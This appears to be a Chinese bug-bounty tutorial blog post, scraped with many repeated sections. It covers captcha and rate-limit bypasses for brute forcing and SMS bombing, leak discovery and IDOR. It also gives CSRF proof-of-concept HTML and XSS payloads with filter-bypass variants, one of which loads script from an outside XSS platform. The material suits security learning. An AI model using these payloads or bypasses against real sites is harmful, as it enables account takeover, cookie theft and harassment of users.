https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#配置错误导致的信息泄露"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#越权导致的信息泄露"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： \u003cimg src=http://www.xxxxx.com/csrf?xx=11 /\u003e (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: \u003chtml\u003e \u003cbody\u003e \u003cform name=\"px\" method=\"post\" action=\"http://www.xxxxx.com/add\"\u003e \u003cinput type=\"text\" name=\"user_id\" value=\"1111\"\u003e \u003c/form\u003e \u003cscript\u003edocument.px.submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： \u003cscript\u003e var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.xxxx.com/api/setrole\"); xhr.withCredentials = true; xhr.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); xhr.send('{\"role\":admin}'); \u003c/script\u003e 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e\u003ccross-domain-policy\u003e \u003callow-access-from domain=\"*\" /\u003e\u003c/cross-domain-policy\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: \u003cscript\u003ealert(1)\u003c/script\u003e \u003cscript src=https://xsspt.com/VBAhTu\u003e\u003c/script\u003e \u003ca href=javascript:alert(1)\u003exss\u003c/a\u003e \u003csvg onload=alert(1)\u003e \u003cimg src=1 onerror=alert(1)\u003e \u003cimg src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)\u003e \u003cdetails open ontoggle=alert(1)\u003e \u003cbody onload=alert(1)\u003e \u003cM onmouseover=alert(1)\u003eM \u003ciframe src=javascript:alert(1)\u003e\u003c/iframe\u003e \u003ciframe onload=alert(1)\u003e \u003cinput type=\"submit\" onfocus=alert(1)\u003e \u003cinput type=\"submit\" onclick=alert(1)\u003e \u003cform\u003e\u003cinput type=\"submit\" formaction=javascript:alert(1)\u003e bypass姿势 \u003c!-- 空格被过滤 --\u003e \u003cimg/src=\"1\"/onerror=alert(1)\u003e \u003c!-- 双写绕过 --\u003e \u003ciimgmg src=1 oonerrornerror=aimglert(1)\u003e \u003c!-- 大小写绕过 --\u003e \u003ciMg src=1 oNerRor=alert(1)\u003e \u003c!-- 利用eval() --\u003e \u003cimg src=1 onerror=\"a=`aler`;b=`t(1)`;eval(a+b);\"\u003e \u003cimg src=1 onerror=eval(atob('YWxlcnQoMSk='))\u003e \u003c!-- 利用location --\u003e \u003cimg src=1 onerror=location='javascript:%61%6C%65%72%74%28%31%29'\u003e \u003cimg src=1 onerror=location='javascript:\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29'\u003e \u003cimg src=1 onerror=location=\"javascr\"+\"ipt:\"+\"%61%6C%65%72%74%28%31%29\"\u003e \u003c!-- 括号被过滤 --\u003e \u003cimg src=1 onerror=\"window.onerror=eval;throw'=alert\\x281\\x29';\"\u003e \u003c!-- onerror=被过滤 --\u003e \u003cimg src=1 onerror =alert(1)\u003e \u003cimg src=1 onerror =alert(1)\u003e \u003c!-- 属性被转换为大写 --\u003e \u003cimg src=1 onerror=alert(1)\u003e \u003c!-- 编码后被检测 --\u003e \u003cimg src=1 onerror=alert(1)\u003e 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#其他的owasptop10漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#csrf漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#3-flash-型"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#任意文件上传漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#xss漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#bypass姿势"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 